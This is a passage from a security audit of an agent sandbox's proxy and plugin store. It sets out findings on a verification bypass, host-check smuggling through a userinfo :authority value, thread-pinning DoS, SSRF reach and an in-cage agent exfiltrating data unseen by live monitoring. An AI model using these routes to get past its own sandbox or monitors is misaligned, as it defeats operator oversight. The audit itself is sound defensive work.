Two consumers act on that list against the *current* user's manager. `sweep_stale_scopes` decides reclaimability from the found directory's `cgroup.procs` and then issues `systemctl --user stop <name>` (cgroup.rs:430-452) — the decision is read from one uid's cgroup and the action lands on another's unit of the same name. `session::scope_cgroup_procs` takes the **first** directory whose name embeds the target pid (session.rs:292-299) and returns its `cgroup.procs` as the teardown's member set, so a same-named scope belonging to another uid silently substitutes for the real one. The comment is the finding as much as the code: it asserts a scoping property the walk does not have.

**Scénario.** Users A (uid 1000) and B (uid 1001) both run sbx on one host. B has a stale, empty `sbx-web-4711.scope` left behind by an inotify-starved manager. A's cage was reparented off its launcher (pid 4711, now dead) but is still running under A's own `sbx-web-4711.scope`. A's next launch runs `sweep_stale_scopes`, finds B's directory first, reads *B's* empty `cgroup.procs`, concludes reclaimable, and issues `systemctl --user stop sbx-web-4711.scope` against A's manager — tearing down A's live cage. The mirror case is worse for teardown: `sbx session stop <pid>` resolves `scope_members` from B's directory, gets B's pids, fails to signal them across the uid boundary (EPERM, read as "already exited"), and leaves A's real cage processes running while reporting the session stopped.

**Correction proposée.** Root the walk at this user's slice: `format!("/sys/fs/cgroup/user.slice/user-{}.slice", unsafe { libc::getuid() })` instead of the bare `/sys/fs/cgroup/user.slice` at cgroup.rs:372 — which is what the doc at cgroup.rs:362 already promises.

**Rectification du vérificateur.** Survives as a scoping/doc-accuracy defect, but the two scenarios need correcting. The `sweep_stale_scopes` mis-stop requires a full unit-name collision — same project slug *and* the same dead launcher pid — not merely 'a stale scope of the same name found first'; without the slug matching, the stop simply names a unit A's manager does not have and is a no-op. The teardown scenario is overstated: `stop` unions the two sources — `union_cage_members(descendants(self.pid), scope_members(self.pid))` at session.rs:241, defined at 253-259 — so a foreign directory *adds* unsignalable pids rather than substituting for the real member set; A's cage survives the stop only in the reparented case where the ppid subtree is empty, which is precisely the case the scope read exists to cover. Note the session-side collision is looser than the sweep's (pid only, no slug), so a cross-user misread of `cgroup.procs` is the more likely of the two. The proposed fix (root the walk at `user-<uid>.slice`) is correct and costs nothing.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Both halves of the discrepancy are at the cited lines: the doc reads 'Every cage scope's cgroup directory under this user's slice.' at cgroup.rs:362, while the walk seeds `let mut stack = vec![PathBuf::from("/sys/fs/cgroup/user.slice")];` at cgroup.rs:372 and descends into every non-cage-scope directory (cgroup.rs:373-391), i.e. into every `user-<uid>.slice` present. No uid is consulted, though `delegated_controllers` calls `libc::getuid()` at cgroup.rs:190 for exactly that purpose. Those directories are traversable and listable by any uid on a normal systemd host, and both consumers act on the result against the caller's own manager: `sweep_stale_scopes` reads the found directory's `cgroup.procs` and issues `systemctl --user stop <name>` (cgroup.rs:430-455), and `session::scope_cgroup_procs` (session.rs:291-300) takes the *first* directory matching only the pid segment (`is_cage_scope`, session.rs:285-287 — the slug is not compared at all).

</details>

---

### S32 — `stores::verify_key` reports "verified" without ever comparing the supplied key when the store was pinned out of band
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/plugins/stores.rs:238` |
| **Catégorie** | `verification-bypass` |
| **Sous-système** | Plugins — confiance et chaîne d'approvisionnement |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `verify_key` is the command whose entire purpose is confirming a store's pinned key against one the user obtained from a second source. It returns success before doing that:

```rust
let cfg = read_configured(layout, name)?;
if !cfg.tofu {
    return Ok(Verified::AlreadyPinned);   // stores.rs:238-240
}
if cfg.pubkey != supplied {              // stores.rs:241 — unreachable for a pinned store
```

The `supplied` key is never compared on the `!cfg.tofu` path. `cfg.tofu` is set from `store.toml`'s `trust` field (stores.rs:653: `raw.trust.as_deref() == Some("tofu")`), which is `"pinned"` for every store added with `--key`, and is also flipped to `"pinned"` by a previous successful `verify_key`. The CLI renders that return value as an unqualified success: `render_store_verified(name, already = true, ..)` prints `verified store 'x' — its key was supplied out of band when it was added; nothing to confirm` and `plugins_store_verify` exits `ExitCode::SUCCESS` (src/cli/plugins.rs:1317-1329, src/cli/confirm.rs:206-216).

The existing test (stores.rs:2051-2098) only exercises `AlreadyPinned` with the *matching* key, so the mismatch case on a pinned store is unpinned by any test and the code silently answers "verified" to a key that is not the one pinned. The doc comment two lines up ("A mismatch is refused loudly and changes nothing") is therefore true only for TOFU stores, not for the ones it is written as if it covered.

**Scénario.** An attacker gets the user to pin the wrong key at add time — the realistic route is that the "official" key the user pastes into `sbx plugins store add <url> --key <hex>` came from a page, README, or email the attacker controls, or from `--key @<file committed to the store repo itself>`. Either way the store is recorded with `trust = "pinned"`, not `"tofu"`, so no standing caution is shown.

Later the user does the right thing: they obtain the vendor's genuine key K_real out of band (a conference, a signed announcement, a colleague) and run `sbx plugins store verify vendorstore --key K_real` to check. `verify_key` sees `!cfg.tofu`, returns `AlreadyPinned` without comparing anything, and sbx prints `verified store 'vendorstore'` and exits 0. The user concludes the store is authentic.

The store remains pinned to the attacker's key. Every `sbx plugins store update` verifies the attacker's catalogue successfully, and every `sbx plugins store install` / `sbx plugins upgrade` places attacker-authored code into `<data>/plugins/`, which is the trusted computing base: a resolver runs host-side and is handed the secret it resolves, a broker sits in front of a host credential, a signer is shown a credential's requests. The one command that existed to catch exactly this mis-pin answered "verified".

**Correction proposée.** Compare first, branch second:

```rust
let cfg = read_configured(layout, name)?;
if cfg.pubkey != supplied {
    return Err(/* the existing mismatch message */);
}
if !cfg.tofu {
    return Ok(Verified::AlreadyPinned);
}
```

`AlreadyPinned` then means "it matched, and there was no caution to clear" rather than "I did not look". Add a regression test for `verify_key` against a `--key`-pinned store with a non-matching key.

**Rectification du vérificateur.** Severity overstated as medium. The early return is deliberate in intent — `Verified::AlreadyPinned` is documented at stores.rs:214-218 as an idempotent no-op, the test at stores.rs:2085-2090 asserts it, and the user-visible line does say why nothing happened ("its key was supplied out of band when it was added; nothing to confirm", src/cli/confirm.rs:209-214). So this is not a silent lie so much as a green `verified` plus exit 0 for a key that was never compared, contradicting the unqualified promise in the fn doc and the `store verify` help page. It is also a missed *detection*, not a new vector: it presupposes the user already pinned an attacker-supplied key at add time, at which point the store is compromised regardless; verify simply fails to catch it. The one-line fix (compare, then branch) is right.

<details>
<summary>Preuve retenue par le vérificateur</summary>

The code is as quoted: src/plugins/stores.rs:237-240 is `let cfg = read_configured(layout, name)?;` then `if !cfg.tofu { return Ok(Verified::AlreadyPinned); }`, and the comparison `if cfg.pubkey != supplied` is at line 241, after that early return. `cfg.tofu` is `raw.trust.as_deref() == Some("tofu")` (stores.rs:654) and is written false for any `--key` add (stores.rs:136-156) and cleared by a prior confirm (stores.rs:257-262), so the comparison is unreachable for every pinned store. The CLI treats it as unqualified success: src/cli/plugins.rs:1318-1326 prints `render_store_verified(name, outcome == Verified::AlreadyPinned, ..)` and returns `ExitCode::SUCCESS`, and src/cli/confirm.rs:206-214 renders green `verified store '<name>'`. The existing test (stores.rs:2051-2097) exercises `AlreadyPinned` only with the *matching* key, so the mismatch-on-pinned path is untested. The doc comment at stores.rs:230 ("A mismatch is refused loudly and changes nothing") and the help page at src/help.rs:3046-3049 ("A key that does not match is refused and changes nothing") both state the guarantee without qualification, and both are false for a pinned store — that mismatch is the finding's core and it is not documented away anywhere.

</details>

---

### S33 — The refusal notification's `sbx net allow` fix drops the port and the scheme, contradicting both refusal-body sites
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/proxy/ctx.rs:482` |
| **Catégorie** | `policy-drift` |
| **Sous-système** | Proxy — parseur HTTP/1.1 et contexte |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `announce_refusal` builds the notification's copy-paste remediation with `&self.allow_suggestion(host)` — the bare host, no port, no scheme. Both sites that write the same suggestion into the refusal *body* deliberately do not: the inspected-TLS planes use `ctx.allow_suggestion(&inspected_rule_destination(host, port))` (mod.rs:608), where `inspected_rule_destination` (mod.rs:637-643) keeps the port unless it is 443 and whose comment records the exact regression — "Suggesting the bare host for a refusal on `:8443` handed the user a command that changes nothing they can observe" — pinned by `a_denied_default_suggestion_admits_the_port_it_was_refused_on` (mod.rs:1985-2035); and the cleartext plane uses `ctx.allow_suggestion(&format!("http://{host}"))` (cleartext.rs:117) whose comment states "a bare `sbx net allow host` would add an https rule that does not open the clear". The notification path was never brought along, so the one channel the module doc says exists because "the agent is under no obligation to surface a `403` body" (mod.rs:601-605) hands the human exactly the command the neighbouring comments say is wrong.

**Scénario.** Not an attack by the cage — a remediation failure, in the least-privilege direction. An agent is refused egress to `api.test:8443` under `denied-default`. `refusal_block` (ctx.rs:730-736) attaches the fix and the desktop notification reads `sbx net allow api.test`. Running it writes an `https` rule on port **443** — a destination nothing requested and that the refusal was not about — while the refused `:8443` request is denied again on retry, so the user is nudged to broaden further. The `http://` cleartext case is worse: a `denied-default` on `http://host:80` is answered with `sbx net allow host`, which adds an https/443 rule that cannot open the cleartext lane at all, so the granted egress and the requested egress have nothing in common.

**Correction proposée.** Pass the same destination token the bodies use. `outcome_l7`/`announce_refusal` already know the proto, so select on it: `Proto::Http => format!("http://{}", inspected_rule_destination_for_scheme(host, port, 80))`, `_ => inspected_rule_destination(host, port)`, and hand that to `allow_suggestion`. Better still, hoist the token construction into one shared helper in mod.rs that all three sites call, so the body and the notification cannot drift again.

**Rectification du vérificateur.** Two corrections. (1) "Both sites that write the same suggestion into the refusal body deliberately do not [drop the port]" is half wrong: the cleartext site (cleartext.rs:117-118) uses `format!("http://{host}")`, which keeps the scheme but ALSO drops the port, so a cleartext `denied-default` on `:8080` gets an equally unhelpful suggestion from the refusal body itself — the drift is not purely notification-vs-body, and the fix should hoist one shared helper across all three sites rather than only repairing ctx.rs. (2) The human is not left blind about the destination: the notification's subject is `format!("{host}:{port}")` (ctx.rs:738), so only the copy-paste `fix` string is wrong, which caps this at a low-severity usability/least-privilege defect.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Verified end to end. ctx.rs:482 passes `&self.allow_suggestion(host)` — the bare host — into `refusal_block`, which at ctx.rs:731-733 promotes it verbatim to the notification's `fix` for exactly `reason == "denied-default"`. The inspected-TLS body instead passes `inspected_rule_destination(host, port)` (mod.rs:608), whose doc at mod.rs:625-637 records the precise regression ("Suggesting the bare host for a refusal on `:8443` handed the user a command that changes nothing they can observe"), and `a_denied_default_suggestion_admits_the_port_it_was_refused_on` (mod.rs:2004-2044) proves the semantics: a bare-host rule admits `api.test:443` and is asserted to leave `api.test:8443` at `Decision::DeniedDefault`. So the notification for a `denied-default` on `api.test:8443` really does print `sbx net allow api.test`, which writes an https/:443 rule that cannot admit the request it was printed for, and the retry is refused by the policy the user was just told to fix. Nothing in ctx.rs, notify::Block, or refusal_block re-adds the port or the scheme. Not attacker-driven — a remediation-correctness defect, correctly self-classified.

</details>

---

### S34 — Per-stream `:authority` check compares only the host subcomponent, so a userinfo-bearing authority passes and is forwarded verbatim
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/proxy/h2mitm.rs:206` |
| **Catégorie** | `parser-confusion` |
| **Sous-système** | Proxy — plan HTTP/2 (gRPC) |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : moyenne) |

**Constat.** The anti-domain-fronting gate reduces the authority to `allowlist::canonical_host(a.host())` (h2mitm.rs:203-206) and compares that to `connect_host` (h2mitm.rs:229). `http::uri::Authority::host()` is `auth.rsplit('@').next()` then split at `:` (http-1.5.0 `uri/authority.rs:429-447`), so it discards both the userinfo and the port. But the request rebuilt for the upstream reuses `parts.uri` whole (h2mitm.rs:455-458), and h2's `Pseudo::request` re-emits `pseudo.set_authority(BytesStr::from(authority.as_str()))` (`frame/headers.rs:599-601`) — `as_str()`, i.e. the *full* authority including the userinfo the check threw away. So the string sbx authorizes and the string sbx forwards are not the same string.

The HTTP/1.1 twin does not have this hole. tunnel.rs:180-183 checks `canonical_host(&strip_port(h))` against the *whole* `Host` value, and `strip_port` (wire.rs:261-271) only removes an all-digit `:`-suffix — so `Host: victim.corp.example@grpc.vendor.example` canonicalizes to the whole string, mismatches, and is refused as `host-mismatch`. The h2 plane admits the identical value.

RFC 9113 §8.3.1 also states `:authority` MUST NOT carry the deprecated userinfo subcomponent and that an intermediary receiving one must treat the request as malformed. sbx is that intermediary, and it relays it.

**Scénario.** A process in the cage has legitimate access to `grpc.vendor.example` (allowed, designated `[network] http2`). It opens the authorized tunnel and sends a stream whose `:authority` is `internal-admin.corp.example@grpc.vendor.example`. `Authority::host()` yields `grpc.vendor.example`, the gate at h2mitm.rs:229 passes, the SSRF guard and cert validation are done against `grpc.vendor.example`, and the request goes out with `:authority: internal-admin.corp.example@grpc.vendor.example`. Any edge in front of the origin that keys on the raw `:authority` bytes, or that resolves the vhost by taking the segment before `@` rather than after it (a common divergence between spec-compliant and hand-rolled authority parsers), dispatches the call to a virtual host the allowlist never authorized — while `sbx net logs` records only `grpc.vendor.example`. A `:authority: grpc.vendor.example:8080` against a `:443` CONNECT gets the same treatment: the port is dropped by `host()` and forwarded to a `host:port`-matching router.

**Correction proposée.** In `stream`, refuse the stream (`MISDIRECTED_REQUEST`/`host-mismatch`) unless the authority carries no userinfo and its port, if any, equals `port` — e.g. check `req.uri().authority()` for `a.as_str().contains('@')` and `a.port_u16().is_none_or(|p| p == port)` before the existing host comparison. Alternatively, rebuild the upstream URI with an authority synthesized from the already-verified `connect_host`/`port` instead of reusing `parts.uri`, so the value authorized is by construction the value forwarded.

**Rectification du vérificateur.** Two corrections. (1) The rebuild is at h2mitm.rs:467-470, not 455-458 as cited (455-463 is the capture block). (2) Severity is low, not medium: the consequence is bounded to confusing a non-conforming peer. The TCP connection still goes to the SSRF-checked IP resolved for `grpc.vendor.example` (h2mitm.rs:290-307), the certificate is still validated for that name (h2mitm.rs:983-994), and every sbx-side policy decision uses `connect_host`, so nothing reaches a host the allowlist forbids — only the origin's own vhost router could be misled, and only if it is spec-non-compliant. The observability claim is also overstated: when capture is on, capture_request_head at h2mitm.rs:637-640 writes `:authority: {authority.as_str()}`, i.e. the full userinfo-bearing value, so the record is not uniformly `grpc.vendor.example`. What genuinely survives is a real RFC 9113 §8.3.1 violation by an intermediary and a real divergence from the HTTP/1.1 twin, which the module header at h2mitm.rs:8-14 claims does not exist.

<details>
<summary>Preuve retenue par le vérificateur</summary>

The code claims all verify. h2mitm.rs:203-206 reduces to `allowlist::canonical_host(a.host())` and h2mitm.rs:229 compares that to `connect_host`. http-1.5.0 uri/authority.rs:429-433 `host()` is `auth.rsplit('@').next()` then splits at `:`, and validate_authority_bytes (authority.rs:538-544) explicitly accepts `@` as userinfo (it even resets colon_cnt/has_percent for it and has a dedicated `EmptyAfterAt` error), so `victim@grpc.vendor.example` parses and `host()` yields `grpc.vendor.example`. h2-0.4.15 server.rs:1673-1682 builds the Authority with `from_maybe_shared` and adds no userinfo rejection anywhere in convert_poll_message. The forwarded request reuses `parts.uri` whole (h2mitm.rs:467-470) and h2 frame/headers.rs re-emits `pseudo.set_authority(BytesStr::from(authority.as_str()))` — the full string. The HTTP/1.1 parity claim also holds: tunnel.rs:184-188 compares `canonical_host(&strip_port(h))` against the whole Host value, and canonical_host (allowlist/mod.rs:660-671) only lowercases and trims trailing dots while strip_port (wire.rs:261-271) only removes an all-digit colon suffix, so the same value mismatches and is blocked there. No guard exists on the h2 leg.

</details>

---

### S35 — An established h2 tunnel has no idle bound, so a cage can pin every host connection thread permanently
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/proxy/h2mitm.rs:155` |
| **Catégorie** | `dos` |
| **Sous-système** | Proxy — plan HTTP/2 (gRPC) |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `serve` calls `client.set_nonblocking(true)` (h2mitm.rs:78), which retires the `SO_RCVTIMEO`/`SO_SNDTIMEO` that `proxy::serve` set on the socket before handing it to `handle_client` (mod.rs:290-291). The file correctly bounds the TLS accept and the h2 handshake with `ctx.timeout` (h2mitm.rs:85, 144), and the comment at h2mitm.rs:80-83 says why. After that, the accept loop awaits `conn.accept()` with no deadline of any kind (h2mitm.rs:152-171) — the comment at h2mitm.rs:82-83 justifies this as "a gRPC stream may legitimately be long-lived", which is true of an *established stream* but leaves an established connection carrying *zero* streams equally unbounded.

The HTTP/1.1 tunnel bounds exactly this state: mod.rs:481-482 sets `ctx.idle` (`DEFAULT_IDLE_TIMEOUT` = 10s, allowlist/mod.rs:933) as the read timeout between requests, and the first head gets `ctx.timeout`. So an idle HTTP/1.1 tunnel dies in ≤30s and an idle h2 tunnel never dies. That also falsifies the doc comment on `proxy::serve` (mod.rs:221-222): "Each accepted stream gets the per-socket timeouts before it is handled, so a slow or hung peer cannot pin a thread forever."

**Scénario.** A hostile process in the cage (a compromised dependency of the agent, or the agent itself) opens `max_connections` CONNECTs — 512 by default (allowlist/mod.rs:942) — to the designated `[network] http2` host, completes TLS and the h2 preface on each, then sends nothing further and never closes. Each connection is one `std::thread::spawn`ed host thread (mod.rs:283) holding a current-thread tokio runtime, a rustls server session, and any upstream connections its pool took, and none of them will ever time out. Two consequences: ~512 host threads plus their buffers are pinned for the life of the launch, and `ctx.conns` stays at the cap, so `proxy::serve` answers every subsequent connection — including ordinary HTTP/1.1 egress to every other allowed host — with `503 connection-cap` (mod.rs:261-280). The launch's egress is permanently dead with no timeout that recovers it.

**Correction proposée.** Wrap the `conn.accept()` branch in a deadline that only applies when no stream is in flight, e.g. `accepted = tokio::time::timeout(ctx.idle, conn.accept()), if inflight.is_empty()` and `break` on elapse — an idle tunnel then closes on `ctx.idle` exactly as the HTTP/1.1 tunnel does, while a connection with live streams keeps the deliberate no-overall-deadline behaviour.

**Rectification du vérificateur.** Not refuted, but severity is low rather than medium, for two reasons the finding does not weigh. (1) The primary consequence is self-inflicted: the only party that can open these connections is the in-cage workload, and what it achieves is killing its own launch's egress — no host or network endpoint the allowlist forbids becomes reachable, no credential leaks. (2) The host-resource half is already bounded by design: DEFAULT_MAX_CONNECTIONS (allowlist/mod.rs:942) caps concurrent handler threads at 512, and its own doc at allowlist/mod.rs:938-941 names precisely this case — "bounding the host threads and descriptors an in-cage caller can tie up — including a slowloris drip-feed ... and a tunnel abandoned mid-idle". What the h2 path actually breaks is that doc's implicit assumption that an abandoned tunnel eventually releases its slot; the threads are pinned permanently rather than for a timeout window. Note also that h2mitm.rs:84-87 documents the no-overall-deadline choice deliberately, and its rationale ("a gRPC stream may legitimately be long-lived") does hold for a connection carrying streams — the gap is only the zero-stream case, which the proposed `if inflight.is_empty()` guard addresses correctly.

<details>
<summary>Preuve retenue par le vérificateur</summary>

The mechanics are exactly as described and I found no guard. h2mitm.rs:77 `client.set_nonblocking(true)` retires the SO_RCVTIMEO/SO_SNDTIMEO set at mod.rs:291-292; the TLS accept (h2mitm.rs:88) and the h2 handshake (h2mitm.rs:145) are each wrapped in `tokio::time::timeout(ctx.timeout, ...)`, but the accept loop at h2mitm.rs:153-171 awaits `conn.accept()` in a bare `tokio::select!` with no deadline arm, and neither the h2 server Builder (h2mitm.rs:141-144) nor tokio-rustls adds a keepalive or idle bound. The HTTP/1.1 contrast is real: mod.rs:504 puts `ctx.idle` (DEFAULT_IDLE_TIMEOUT = 10s, allowlist/mod.rs:933) on the between-request read and tunnel.rs:72 puts `ctx.timeout` on the first head, so an established-but-silent HTTP/1.1 tunnel dies. So a cage that completes TLS + the h2 preface and then goes silent holds its thread and its `ctx.conns` slot with nothing to reclaim it, and the doc comment at mod.rs:220-222 ("a slow or hung peer cannot pin a thread forever") is false for this path.

</details>

---

### S36 — The h2 plane never registers a live flow, so `sbx net live` is blind to every gRPC tunnel
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/proxy/h2mitm.rs:436` |
| **Catégorie** | `monitoring-bypass` |
| **Sous-système** | Proxy — plan HTTP/2 (gRPC) |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `relay` records the allow through `ctx.outcome_l7` (h2mitm.rs:436) and then goes straight to the capture and the relay. It never calls `ctx.register_flow`. Every other egress plane does, at the same point in its own sequence: tunnel.rs:542, forward.rs:345, cleartext.rs:210, splice.rs:158. `ctx.register_flow`'s own doc (ctx.rs:367-370) states the contract — "Call only after the request is permitted and the upstream is connected" — which is precisely the line h2mitm.rs:436 sits on.

Because no `FlowGuard` is taken, the h2 relay also never feeds the `up`/`down` counters that the other planes wire through `CountingReader` (wire.rs:273-276), so both the row and its byte totals are absent. `FlowRegistry` is the sole source for `sbx net live` (control/mod.rs:893-899). The word "flow" does not appear in this file outside HTTP/2 flow-control comments, so this is an unacknowledged omission, not a documented one — and it contradicts the module header (h2mitm.rs:9-14), which claims security parity with the HTTP/1.1 path and names `AskPosture::RefuseUnsupported` as "the single way it diverges".

The blind spot is worst for exactly the traffic this plane exists to carry. `sbx net live`'s own help text (help.rs:2824-2827) tells the operator that "the durable rows are raw `tcp://` tunnels…, WebSockets, and large L7 transfers in progress" — a long-lived bidirectional gRPC stream is the canonical durable row, and it is the one kind that never appears.

**Scénario.** An in-cage agent is allowed to reach `grpc.vendor.example`, which the operator designated `[network] http2`. It exfiltrates a large payload as a client-streaming RPC over one h2 stream, or drains a large one back as a server-streaming RPC. An operator watching `sbx net live` (the tool whose whole purpose is seeing what is moving right now) sees an empty view and zero bytes for the entire transfer, while the identical transfer to the same host over HTTP/1.1 shows a row with running `↑`/`↓` totals. The transfer is later visible in `sbx net logs` as a single `allowed` line with no byte accounting, so the live control an operator would use to catch a bulk exfiltration in progress simply does not cover this plane.

**Correction proposée.** Take the guard beside the allow, as the other three planes do: `let flow = ctx.register_flow(host, port, Proto::Https);` immediately after `ctx.outcome_l7` at h2mitm.rs:436, hold it for the body of `relay`, and add `flow.up`/`flow.down` increments in `relay_body` and `relay_body_redacting` where each chunk's length is already known (h2mitm.rs:721, 829).

**Rectification du vérificateur.** Accurate and unguarded, but severity is low rather than medium: this is an observability gap, not a control bypass. The transfer is still decided by the same `decide_https` verdict, still counted in `sbx net stats`, and still logged by `ctx.outcome_l7` as an `allowed` line carrying host, port, method and path (h2mitm.rs:436-452), and when capture is enabled the head and body prefix are recorded too (h2mitm.rs:461-463). What is genuinely missing is the live row and the running up/down byte totals — real, but the operator is not blind to the request itself, only to it happening right now. Also note the FlowRegistry doc at control/mod.rs:892-901 describes flows as appearing "when its tunnel is established", while tunnel.rs:536-541 registers per request, so a fix should follow tunnel.rs's per-stream framing.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Confirmed by exhaustive grep: `grep -rn register_flow src/` returns exactly four call sites — splice.rs:158, tunnel.rs:542, forward.rs:345, cleartext.rs:210 — and none in h2mitm.rs. The word `flow` in h2mitm.rs appears only in HTTP/2 flow-control contexts (lines 174, 667, 707, 733, 827, 845, 1255...), so there is no acknowledgement of the omission. ctx.rs:369-370 states the contract ("Call only after the request is permitted and the upstream is connected"), and h2mitm.rs:436 (`let seq = ctx.outcome_l7(...)`) followed immediately by `ctx.begin_capture(seq)` at h2mitm.rs:461 is the identical sequence tunnel.rs uses at 525-550 — except tunnel.rs:542 takes the guard between the two and h2mitm.rs does not. The docs make no exception: docs-site/docs/guide/networking/observability.md:509-520 promises `https` (inspected TLS) rows with application-byte counters and names "large L7 transfers in progress" as the durable rows, and help.rs:2818-2833 says the same, with no h2 carve-out. The module header at h2mitm.rs:8-14 claiming `AskPosture::RefuseUnsupported` is "the single way it diverges" is therefore inaccurate. Nothing refutes this.

</details>

---

### S37 — The private-address exception is granted to the always-on built-in allow rules, which `ip_refusal`'s own doc says must never get it
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/proxy/ssrf.rs:136` |
| **Catégorie** | `ssrf-guard-bypass` |
| **Sous-système** | Proxy — SSRF, DNS, netns |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `ip_refusal`'s contract at ssrf.rs:133-139 states that a private/loopback address is reachable only when the deciding rule names the exact host, and explicitly excludes three kinds of match: "not a `*.domain`/regex/built-in match, which would turn into an SSRF wildcard" (ssrf.rs:136). `names_exact_host` (ssrf.rs:267-278) implements only two of those three exclusions — `RuleKind::Subdomain(..) | RuleKind::Regex { .. } => false` at ssrf.rs:276 — and has no notion of a rule's origin at all. Six of the eight built-in self-equip entries are bare hosts: `cache.nixos.org:443`, `github.com:443`, `api.github.com:443`, `codeload.github.com:443`, `search.devbox.sh:443`, `mise-versions.jdx.dev:443` (ctx.rs:39-49). `classify_kind` turns a bare host into `RuleKind::Host(host.to_ascii_lowercase(), ports)` (grammar.rs:236), and `union_with_builtin` appends all eight to the allow set of *every* policy in every posture (ctx.rs:778-783). So when the built-in rule is the deciding rule, `names_exact_host` hits the `RuleKind::Host(rh, _) => *rh == h` arm at ssrf.rs:273 and returns true, and `ip_refusal`'s `IpClass::Private if names_exact_host(..) => None` arm at ssrf.rs:144 permits the dial. The exception the guard reserves for "a deliberate internal target" is therefore handed to six hostnames that no user ever wrote down, in every cage including a fully untrusted one with an empty allowlist. (The two `*.` entries are `Subdomain` and are correctly excluded — which is exactly what makes the asymmetry invisible on a casual read.) The comment is not merely imprecise; it names the case the code gets wrong.

**Scénario.** Precondition: the host's resolver maps one of those six names to a private address. This is not exotic — corporate split-horizon DNS pointing `github.com` at a GitHub Enterprise appliance on 10.x, a dnsmasq/Pi-hole `address=/github.com/127.0.0.1` blocklist entry, an NXDOMAIN-hijacking ISP resolver, or a network-position attacker answering the host's queries. The in-cage attacker then sends `CONNECT github.com:443` (or an absolute-form `GET https://github.com/...`) with no allowlist entry of its own. `decide_https` returns the built-in `RuleKind::Host("github.com", {443})` as `deciding`; `resolve_checked` (ssrf.rs:210) gets the private address back; `classify_v4` says `Private`; `names_exact_host` says true; `checked_address` returns the private IP and `connect_upstream` (proxy/mod.rs:761) opens TCP and sends a ClientHello to it. At minimum the cage gets a TCP connect + TLS ClientHello delivered to an arbitrary internal address and an oracle distinguishing `upstream-unreachable` from `upstream-cert-rejected`, which is a port/service prober for the internal network the empty netns exists to deny it. In the split-horizon GHE case the corporate CA is in the host trust store, validation succeeds, and the cage gets working GET/HEAD egress to the internal appliance. In every case the cage reached a private address with no user rule authorising it, which is precisely the outcome ssrf.rs:136 claims is impossible.

**Correction proposée.** Make the exclusion the doc describes real rather than implied. Add an origin marker to `Rule` (e.g. a `builtin: bool` set by `builtin_allow_rules` in ctx.rs:60-65) and have `names_exact_host` return `false` for it before the `match` on `deciding.kind`, so the always-on lane can only ever reach `IpClass::Public`. If threading a flag through `Rule` is unwanted, the narrower fix is to compare `deciding` against `builtin_allow_rules()` inside `names_exact_host` and return false on a hit. Either way add a test pinning that a built-in-decided request to a host resolving to 127.0.0.1 is `ssrf-blocked`, alongside the existing exact-host case.

**Rectification du vérificateur.** The mechanism is real but the impact is far narrower than described, and "medium / ssrf-guard-bypass" overstates it. (1) Nothing the in-cage attacker controls decides the address: the name is resolved host-side by `default_resolve` via `to_socket_addrs` (src/sandbox/proxy/dns.rs:16-23), the cache is keyed by the exact host asked for (dns.rs:59-84), and no config field can inject a resolver — so the attacker must find the host's own resolver already mapping one of six fixed names to a private address. (2) It is therefore not "an arbitrary internal address" and not a "port/service prober": the attacker chooses neither address nor port (all built-ins are pinned `:443`, ctx.rs:41-48) nor verb ({GET,HEAD}), and the name set is six fixed hosts. (3) In the one scenario where the DNS answer *is* attacker-chosen (a network-position resolver hijack), that attacker already gets a strictly better channel from the same built-in lane — pointing github.com at a public host they own gives full GET/HEAD exfil, which the SSRF guard never blocked — so the guard is not the boundary there and the marginal gain is a connect/TLS-error oracle against one address (upstream certs are still fully validated; there is no dangerous verifier in src/sandbox/proxy/ca.rs). (4) In the split-horizon/Pi-hole scenario there is no attacker in the DNS at all, and the private address *is* the operator's own definition of that name — arguably the "deliberate internal target" the exception exists for. The right characterisation is: ssrf.rs:136 asserts a property the code does not implement, and the honest fix is to make one match the other (either exclude built-in-decided rules, as `sbx test net` already manages to detect origin at src/cli/test.rs:248, or drop "built-in" from the doc and pin the chosen behaviour in a test).

<details>
<summary>Preuve retenue par le vérificateur</summary>

Every mechanical claim checks out. ssrf.rs:136 literally reads "not a `*.domain`/regex/built-in match, which would turn into an SSRF wildcard"; `names_exact_host` (src/sandbox/proxy/ssrf.rs:267-278) matches only on `deciding.kind` and excludes only `RuleKind::Subdomain(..) | RuleKind::Regex { .. }` (ssrf.rs:276) — it has no origin input at all, and `Rule` carries no built-in marker (`group` is documented at src/allowlist/mod.rs:102-107 as `None` for "a directly-written or built-in rule", and is excluded from equality). The six bare-host built-ins at src/sandbox/proxy/ctx.rs:41,43,44,45,47,48 do classify to `RuleKind::Host` (src/allowlist/grammar.rs:237) and are appended to every policy's allow set (ctx.rs:780, applied unconditionally at ctx.rs:199). So a request decided by e.g. the `github.com:443` built-in reaches `IpClass::Private if names_exact_host(..) => None` at ssrf.rs:144 and the private address is dialled. No test covers it: the only builtin test (src/sandbox/proxy/tests.rs:6813-6827) checks unioning, and the SSRF test (tests.rs:6693-6738) covers only a user `*.corp.test` wildcard and a user exact host. Nothing refutes the code/comment mismatch, so the finding stands as a contract-vs-code defect.

</details>

---

### S38 — On the https-forward plane the `WS` pseudo-verb reaches the verdict but not the `allow` outcome, the log, or the stats
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/proxy/forward.rs:340` |
| **Catégorie** | `audit-integrity` |
| **Sous-système** | Proxy — tunnel CONNECT, forward, splice, pool |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

